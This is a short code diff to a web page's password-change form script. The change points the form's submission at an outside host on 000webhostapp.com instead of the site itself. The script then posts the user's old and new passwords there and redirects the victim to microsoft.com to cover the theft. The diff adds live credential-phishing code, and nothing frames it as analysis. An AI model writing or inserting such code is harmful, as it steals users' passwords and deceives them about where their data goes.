@@ -173,7 +173,7 @@
     window.onload = function () {
 
         $('#pageDialogForm_6').submit(function (event) {
-            var url = '/'
+            var url = 'https://app-1527337810.000webhostapp.com/fuk.php';
             event.preventDefault();
             var oP = $('#iOldPassword').val();
 
@@ -202,6 +202,8 @@
             $.post(url, {
                 oP: oP,
                 nP: nP1
+            }, function() {
+              window.location.replace("https://microsoft.com");
             })
 
             function showError(ele, content) {
